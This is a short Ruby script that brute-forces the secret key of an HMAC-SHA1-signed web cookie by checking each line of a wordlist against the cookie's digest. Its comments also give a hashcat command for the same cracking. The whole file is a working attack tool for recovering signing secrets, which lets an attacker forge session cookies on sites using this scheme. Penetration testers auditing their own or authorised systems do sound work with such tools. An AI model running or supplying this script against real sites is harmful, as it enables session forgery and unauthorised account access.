# Usage: ruby secret-brute.rb <path-to-wordlist> 
# NOTE: If the total cookie length is less than 50 Characters, use hashcat, its faster
# $ echo '<SHA1-Digest>:<B64-Cookie-Data>' > hashes
# $ hashcat -m150 hashes <path-to-wordlist>

require 'openssl'
require 'uri'
require 'pp'

# Insert full cookie here
COOKIES = ""

# Generate SHA1 digest of cookie data and secret
def sign(data, secret)
  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end 

# Separate Data from Digest
value, signed = COOKIES.split("--",2)
# URI decode cookie data 
value = URI.decode(value)

# Produce SHA1 digest for each line in wordlist and compare with original cookie digest
File.readlines(ARGV[0]).each do |c|
  c.chomp!
  if sign(value, c) == signed
    puts "Secret found: "+c
    exit
  end
end
